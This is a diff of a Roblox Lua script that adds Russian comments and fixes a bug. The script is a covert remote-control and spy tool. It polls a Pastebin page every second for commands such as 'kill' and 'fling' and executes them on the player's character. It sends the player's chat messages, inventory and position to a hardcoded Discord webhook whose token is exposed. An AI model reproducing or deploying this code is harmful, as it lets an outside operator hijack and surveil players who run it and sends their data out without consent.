@@ -1,21 +1,29 @@
 -- [[ CONFIG ]] --
 local settings = {
+    -- Твой Discord Webhook для получения логов и чата
     webhook = "https://discord.com/api/webhooks/1464945164584747190/cR2qV7opyFlK3id2k-tZVEu8ALLn9wMDxEZdj66IaRNGnHl0Vn_AwjwtWrEjxjaSkN8_",
+    -- Ссылка на Pastebin (в формате RAW), где ты пишешь команды
     control = "https://pastebin.com/raw/EsjZSDrA",
+    -- Как часто проверять команды (в секундах)
     check_delay = 1
 }
 
+-- [[ SERVICES ]] --
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HTTP Service")
+local HttpService = game:GetService("HttpService") -- ИСПРАВЛЕНО: Убран пробел (был "HTTP Service")
 local RunService = game:GetService("RunService")
 local Debris = game:GetService("Debris")
 local lp = Players.LocalPlayer
 
+-- [[ FUNCTIONS ]] --
+
+-- Универсальная функция запроса для разных экзекуторов
 local function requestFunc(options)
     local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
     if fn then return fn(options) end
 end
 
+-- Сбор списка предметов в инвентаре и в руках
 local function getInventory()
     local tools = {}
     local backpack = lp:FindFirstChild("Backpack")
@@ -34,6 +42,7 @@ local function getInventory()
     return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
+-- Отправка красивых логов в Discord
 local function sendLog(title, desc, color)
     task.spawn(function()
         local pos = "Unknown"
@@ -68,10 +77,12 @@ local function sendLog(title, desc, color)
     end)
 end
 
+-- [[ MAIN LOOP ]] --
 task.spawn(function()
     local last_cmd = ""
     local flingConnection
     
+    -- Получаем текущее содержимое Pastebin при запуске
     pcall(function()
         local res = game:HttpGet(settings.control .. "?t=" .. tick())
         last_cmd = res:gsub("%s+", ""):lower()
@@ -80,14 +91,16 @@ task.spawn(function()
     while true do
         task.wait(settings.check_delay)
         
+        -- Попытка прочитать команду из Pastebin
         local ok, res = pcall(function() 
             return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
         end)
 
         if ok and res then
-            local clean_res = res:match("^%s*(.-)%s*$")
+            local clean_res = res:match("^%s*(.-)%s*$") -- Убираем лишние пробелы по бокам
             local current_cmd = clean_res:lower()
 
+            -- Если появилась новая команда (и это не "safe")
             if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                 last_cmd = current_cmd
                 
@@ -95,6 +108,7 @@ task.spawn(function()
                 local hrp = char and char:FindFirstChild("HumanoidRootPart")
                 local hum = char and char:FindFirstChildOfClass("Humanoid")
 
+                -- Обработка команд
                 if current_cmd == "kill" and hum then
                     hum.Health = 0
                     sendLog("💀 КИЛЛ", "Ликвидирован.")
@@ -149,8 +163,11 @@ task.spawn(function()
     end
 end)
 
+-- [[ CHAT SPY ]] --
+-- Отслеживание всех сообщений игрока в чате
 lp.Chatted:Connect(function(m) 
     sendLog("💬 ЧАТ", "```" .. m .. "```", 0x3498DB) 
 end)
 
+-- Начальный лог о запуске
 sendLog("🛰️ СИСТЕМА", "Скрипт запущен. Ожидание команд...", 0x00FF00)
